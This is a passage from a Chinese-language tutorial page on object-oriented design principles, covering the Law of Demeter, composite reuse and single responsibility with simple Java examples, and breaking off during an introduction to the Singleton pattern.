src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230108204621982.png" alt="image-20230108204621982" /></p><p><code>Demeter1.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.demeter;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-comment">//客户端</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demeter1</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">//创建了一个 SchoolManager 对象</span><br>      <span class="hljs-type">SchoolManager</span> <span class="hljs-variable">schoolManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SchoolManager</span>();<br>      <span class="hljs-comment">//输出学院的员工id 和  学校总部的员工信息</span><br>      schoolManager.printAllEmployee(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CollegeManager</span>());<br><br>   &#125;<br><br>&#125;<br><br><br><span class="hljs-comment">//学校总部员工类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> &#123;<br>   <span class="hljs-keyword">private</span> String id;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(String id)</span> &#123;<br>      <span class="hljs-built_in">this</span>.id = id;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> id;<br>   &#125;<br>&#125;<br><br><br><span class="hljs-comment">//学院的员工类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CollegeEmployee</span> &#123;<br>   <span class="hljs-keyword">private</span> String id;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(String id)</span> &#123;<br>      <span class="hljs-built_in">this</span>.id = id;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> id;<br>   &#125;<br>&#125;<br><br><br><span class="hljs-comment">//管理学院员工的管理类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CollegeManager</span> &#123;<br>   <span class="hljs-comment">//返回学院的所有员工</span><br>   <span class="hljs-keyword">public</span> List&lt;CollegeEmployee&gt; <span class="hljs-title function_">getAllEmployee</span><span class="hljs-params">()</span> &#123;<br>      List&lt;CollegeEmployee&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;CollegeEmployee&gt;();<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123; <span class="hljs-comment">//这里我们增加了10个员工到 list</span><br>         <span class="hljs-type">CollegeEmployee</span> <span class="hljs-variable">emp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CollegeEmployee</span>();<br>         emp.setId(<span class="hljs-string">&quot;学院员工id= &quot;</span> + i);<br>         list.add(emp);<br>      &#125;<br>      <span class="hljs-keyword">return</span> list;<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//学校管理类</span><br><br><span class="hljs-comment">//分析 SchoolManager 类的直接朋友类有哪些 Employee、CollegeManager</span><br><span class="hljs-comment">//CollegeEmployee 不是 直接朋友 而是一个陌生类，这样违背了 迪米特法则 </span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SchoolManager</span> &#123;<br>   <span class="hljs-comment">//返回学校总部的员工</span><br>   <span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">getAllEmployee</span><span class="hljs-params">()</span> &#123;<br>      List&lt;Employee&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Employee&gt;();<br>      <br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123; <span class="hljs-comment">//这里我们增加了5个员工到 list</span><br>         <span class="hljs-type">Employee</span> <span class="hljs-variable">emp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>();<br>         emp.setId(<span class="hljs-string">&quot;学校总部员工id= &quot;</span> + i);<br>         list.add(emp);<br>      &#125;<br>      <span class="hljs-keyword">return</span> list;<br>   &#125;<br><br>   <span class="hljs-comment">//该方法完成输出学校总部和学院员工信息(id)</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">printAllEmployee</span><span class="hljs-params">(CollegeManager sub)</span> &#123;<br>      <br>      <span class="hljs-comment">//分析问题</span><br>      <span class="hljs-comment">//1. 这里的 CollegeEmployee 不是  SchoolManager的直接朋友</span><br>      <span class="hljs-comment">//2. CollegeEmployee 是以局部变量方式出现在 SchoolManager</span><br>      <span class="hljs-comment">//3. 违反了 迪米特法则 </span><br>      <br>      <span class="hljs-comment">//获取到学院员工</span><br>      List&lt;CollegeEmployee&gt; list1 = sub.getAllEmployee();<br>      System.out.println(<span class="hljs-string">&quot;------------学院员工------------&quot;</span>);<br>      <span class="hljs-keyword">for</span> (CollegeEmployee e : list1) &#123;<br>         System.out.println(e.getId());<br>      &#125;<br>      <span class="hljs-comment">//获取到学校总部员工</span><br>      List&lt;Employee&gt; list2 = <span class="hljs-built_in">this</span>.getAllEmployee();<br>      System.out.println(<span class="hljs-string">&quot;------------学校总部员工------------&quot;</span>);<br>      <span class="hljs-keyword">for</span> (Employee e : list2) &#123;<br>         System.out.println(e.getId());<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="应用实例改进"><a class="markdownIt-Anchor" href="#应用实例改进"></a> 应用实例改进</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230108204609508.png" alt="image-20230108204609508" /></p><ol><li><p>前面设计的问题在于 SchoolManager 中，<strong>CollegeEmployee 类并不是 SchoolManager</strong> 类的直接朋友 (分析)</p></li><li><p>按照迪米特法则，应该避免类中出现这样非直接朋友关系的耦合</p></li></ol><p><code>Demeter1.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.demeter.improve;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-comment">//客户端</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demeter1</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;~~~使用迪米特法则的改进~~~&quot;</span>);<br>      <span class="hljs-comment">//创建了一个 SchoolManager 对象</span><br>      <span class="hljs-type">SchoolManager</span> <span class="hljs-variable">schoolManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SchoolManager</span>();<br>      <span class="hljs-comment">//输出学院的员工id 和  学校总部的员工信息</span><br>      schoolManager.printAllEmployee(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CollegeManager</span>());<br><br>   &#125;<br><br>&#125;<br><br><br><span class="hljs-comment">//学校总部员工类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> &#123;<br>   <span class="hljs-keyword">private</span> String id;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(String id)</span> &#123;<br>      <span class="hljs-built_in">this</span>.id = id;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> id;<br>   &#125;<br>&#125;<br><br><br><span class="hljs-comment">//学院的员工类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CollegeEmployee</span> &#123;<br>   <span class="hljs-keyword">private</span> String id;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(String id)</span> &#123;<br>      <span class="hljs-built_in">this</span>.id = id;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> id;<br>   &#125;<br>&#125;<br><br><br><span class="hljs-comment">//管理学院员工的管理类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CollegeManager</span> &#123;<br>   <span class="hljs-comment">//返回学院的所有员工</span><br>   <span class="hljs-keyword">public</span> List&lt;CollegeEmployee&gt; <span class="hljs-title function_">getAllEmployee</span><span class="hljs-params">()</span> &#123;<br>      List&lt;CollegeEmployee&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;CollegeEmployee&gt;();<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123; <span class="hljs-comment">//这里我们增加了10个员工到 list</span><br>         <span class="hljs-type">CollegeEmployee</span> <span class="hljs-variable">emp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CollegeEmployee</span>();<br>         emp.setId(<span class="hljs-string">&quot;学院员工id= &quot;</span> + i);<br>         list.add(emp);<br>      &#125;<br>      <span class="hljs-keyword">return</span> list;<br>   &#125;<br>   <br>   <span class="hljs-comment">//输出学院员工的信息</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printEmployee</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">//获取到学院员工</span><br>      List&lt;CollegeEmployee&gt; list1 = getAllEmployee();<br>      System.out.println(<span class="hljs-string">&quot;------------学院员工------------&quot;</span>);<br>      <span class="hljs-keyword">for</span> (CollegeEmployee e : list1) &#123;<br>         System.out.println(e.getId());<br>      &#125;<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//学校管理类</span><br><br><span class="hljs-comment">//分析 SchoolManager 类的直接朋友类有哪些 Employee、CollegeManager</span><br><span class="hljs-comment">//CollegeEmployee 不是 直接朋友 而是一个陌生类，这样违背了 迪米特法则 </span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SchoolManager</span> &#123;<br>   <span class="hljs-comment">//返回学校总部的员工</span><br>   <span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">getAllEmployee</span><span class="hljs-params">()</span> &#123;<br>      List&lt;Employee&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Employee&gt;();<br>      <br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123; <span class="hljs-comment">//这里我们增加了5个员工到 list</span><br>         <span class="hljs-type">Employee</span> <span class="hljs-variable">emp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>();<br>         emp.setId(<span class="hljs-string">&quot;学校总部员工id= &quot;</span> + i);<br>         list.add(emp);<br>      &#125;<br>      <span class="hljs-keyword">return</span> list;<br>   &#125;<br><br>   <span class="hljs-comment">//该方法完成输出学校总部和学院员工信息(id)</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">printAllEmployee</span><span class="hljs-params">(CollegeManager sub)</span> &#123;<br>      <br>      <span class="hljs-comment">//分析问题</span><br>      <span class="hljs-comment">//1. 将输出学院的员工方法，封装到CollegeManager</span><br>      sub.printEmployee();<br>   <br>      <span class="hljs-comment">//获取到学校总部员工</span><br>      List&lt;Employee&gt; list2 = <span class="hljs-built_in">this</span>.getAllEmployee();<br>      System.out.println(<span class="hljs-string">&quot;------------学校总部员工------------&quot;</span>);<br>      <span class="hljs-keyword">for</span> (Employee e : list2) &#123;<br>         System.out.println(e.getId());<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="迪米特法则注意事项和细节"><a class="markdownIt-Anchor" href="#迪米特法则注意事项和细节"></a> 迪米特法则注意事项和细节</h3><ol><li><p>迪米特法则的核心是降低类之间的耦合</p></li><li><p>但是注意：由于每个类都减少了不必要的依赖，因此迪米特法则只是要求降低类间(对象间)耦合关系， 并不是要求完全没有依赖关系</p></li></ol><h2 id="6-合成复用原则composite-reuse-principle"><a class="markdownIt-Anchor" href="#6-合成复用原则composite-reuse-principle"></a> <strong>6、合成复用原则（Composite Reuse Principle）</strong></h2><p>合成复用原则是指：尽量使用合成/聚合的方式，而不是使用继承。</p><ol><li><p>找出应用中可能需要变化之处，把它们独立出来，不要和那些不需要变化的代码混在一起。</p></li><li><p>针对接口编程，而不是针对实现编程。</p></li><li><p>为了交互对象之间的<strong>松耦合设计而努</strong>力</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230108204802649.png" alt="image-20230108204802649" /></p><h2 id="7-单一职责原则single-principle"><a class="markdownIt-Anchor" href="#7-单一职责原则single-principle"></a> <strong>7、单一职责原则（Single Principle）</strong></h2><p>对类来说的，<strong>即一个类应该只负责一项职责</strong>。如类 A 负责两个不同职责：职责 1，职责 2。当职责 1 需求变更而改变 A 时，可能造成职责 2 执行错误，所以需要将类 A 的粒度分解为 A1，A2</p><p><code>SingleResponsibility1.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.singleresponsibility;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingleResponsibility1</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Vehicle</span> <span class="hljs-variable">vehicle</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vehicle</span>();<br>      vehicle.run(<span class="hljs-string">&quot;摩托车&quot;</span>);<br>      vehicle.run(<span class="hljs-string">&quot;汽车&quot;</span>);<br>      vehicle.run(<span class="hljs-string">&quot;飞机&quot;</span>);<br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">// 交通工具类</span><br><span class="hljs-comment">// 方式1</span><br><span class="hljs-comment">// 1. 在方式1 的run方法中，违反了单一职责原则</span><br><span class="hljs-comment">// 2. 解决的方案非常的简单，根据交通工具运行方法不同，分解成不同类即可</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Vehicle</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(String vehicle)</span> &#123;<br>      System.out.println(vehicle + <span class="hljs-string">&quot; 在公路上运行....&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SingleResponsibility2.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.singleresponsibility;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingleResponsibility2</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">RoadVehicle</span> <span class="hljs-variable">roadVehicle</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RoadVehicle</span>();<br>      roadVehicle.run(<span class="hljs-string">&quot;摩托车&quot;</span>);<br>      roadVehicle.run(<span class="hljs-string">&quot;汽车&quot;</span>);<br>      <br>      <span class="hljs-type">AirVehicle</span> <span class="hljs-variable">airVehicle</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AirVehicle</span>();<br>      <br>      airVehicle.run(<span class="hljs-string">&quot;飞机&quot;</span>);<br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">//方案2的分析</span><br><span class="hljs-comment">//1. 遵守单一职责原则</span><br><span class="hljs-comment">//2. 但是这样做的改动很大，即将类分解，同时修改客户端</span><br><span class="hljs-comment">//3. 改进：直接修改Vehicle 类，改动的代码会比较少=&gt;方案3</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RoadVehicle</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(String vehicle)</span> &#123;<br>      System.out.println(vehicle + <span class="hljs-string">&quot;公路运行&quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AirVehicle</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(String vehicle)</span> &#123;<br>      System.out.println(vehicle + <span class="hljs-string">&quot;天空运行&quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">WaterVehicle</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(String vehicle)</span> &#123;<br>      System.out.println(vehicle + <span class="hljs-string">&quot;水中运行&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SingleResponsibility3.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.singleresponsibility;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingleResponsibility3</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Vehicle2</span> <span class="hljs-variable">vehicle2</span>  <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vehicle2</span>();<br>      vehicle2.run(<span class="hljs-string">&quot;汽车&quot;</span>);<br>      vehicle2.runWater(<span class="hljs-string">&quot;轮船&quot;</span>);<br>      vehicle2.runAir(<span class="hljs-string">&quot;飞机&quot;</span>);<br>   &#125;<br><br>&#125;<br><br><br><span class="hljs-comment">//方式3的分析</span><br><span class="hljs-comment">//1. 这种修改方法没有对原来的类做大的修改，只是增加方法</span><br><span class="hljs-comment">//2. 这里虽然没有在类这个级别上遵守单一职责原则，但是在方法级别上，仍然是遵守单一职责</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Vehicle2</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(String vehicle)</span> &#123;<br>      <span class="hljs-comment">//处理</span><br>      <br>      System.out.println(vehicle + <span class="hljs-string">&quot; 在公路上运行....&quot;</span>);<br>      <br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">runAir</span><span class="hljs-params">(String vehicle)</span> &#123;<br>      System.out.println(vehicle + <span class="hljs-string">&quot; 在天空上运行....&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">runWater</span><span class="hljs-params">(String vehicle)</span> &#123;<br>      System.out.println(vehicle + <span class="hljs-string">&quot; 在水中行....&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-comment">//方法2.</span><br>   <span class="hljs-comment">//..</span><br>   <span class="hljs-comment">//..</span><br>   <br>   <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="单一职责原则注意事项和细节"><a class="markdownIt-Anchor" href="#单一职责原则注意事项和细节"></a> 单一职责原则注意事项和细节</h3><ol><li><p>降低类的复杂度，一个类只负责一项职责。</p></li><li><p>高类的可读性，可维护性</p></li><li><p>降低变更引起的风险</p></li><li><p>通常情况下，我们应当遵守单一职责原则，只有逻辑足够简单，才可以在代码级违反单一职责原则；只有类中方法数量足够少，可以在方法级别保持单一职责原则</p></li></ol><h1 id="单例模式"><a class="markdownIt-Anchor" href="#单例模式"></a> <mark>单例模式</mark></h1><p>最为重要</p><p>单例模式（Singleton Pattern）是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。</p><p>这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。</p><p><strong>注意：</strong></p><ul><li>1、单例类只能有一个实例。</li><li>2、单例类必须自己创建自己的唯一实例。</li><li>3、单例类必须给所有其他对象提供这一实例。</li></ul><h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h2><p><strong>意图：</strong> 保证一个类仅有一个实例，并提供一个访问它的全局访问点。</p><p><strong>主要解决：</strong> 一个全局使用的类频繁地创建与销毁。</p><p><strong>何时使用：</strong> 当您想控制实例数目，节省系统资源的时候。</p><p><strong>如何解决：</strong> 判断系统是否已经有这个单例，如果有则返回，如果没有则创建。</p><p><strong>关键代码：</strong> 构造函数是私有的。</p><p><strong>应用实例：</strong></p><ul><li>1、一个班级只有一个班主任。</li><li>2、Windows 是多进程多线程的，在操作一个文件的时候，就不可避免地出现多个进程或线程同时操作一个文件的现象，所以所有文件的处理必须通过唯一的实例来进行。</li><li>3、一些设备管理器常常设计为单例模式，比如一个电脑有两台打印机，在输出的时候就要处理不能两台打印机打印同一个文件。</li></ul><p><strong>优点：</strong></p><ul><li>1、在内存里只有一个实例，减少了内存的开销，尤其是频繁的创建和销毁实例（比如管理学院首页页面缓存）。</li><li>2、避免对资源的多重占用（比如写文件操作）。</li></ul><p><strong>缺点：</strong> 